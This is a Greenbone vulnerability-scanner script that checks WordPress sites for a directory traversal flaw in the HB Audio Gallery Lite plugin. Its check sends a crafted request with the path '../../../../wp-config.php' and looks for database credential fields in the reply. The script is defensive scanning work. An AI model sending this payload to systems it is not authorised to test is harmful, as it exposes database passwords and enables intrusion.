# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807529");
  script_version("2023-07-20T05:05:17+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:26 +0530 (Fri, 01 Apr 2016)");
  script_name("WordPress HB Audio Gallery Lite Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'HB Audio Gallery Lite' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Flaw is due to insufficient validation
  of input via 'file_path' parameter to 'gallery/audio-download.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files.");

  script_tag(name:"affected", value:"WordPress Plugin HB Audio Gallery Lite
  version 1.0.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39589");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?'
          + 'file_path=../../../../wp-config.php&file_size=10';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
  pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
{
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}
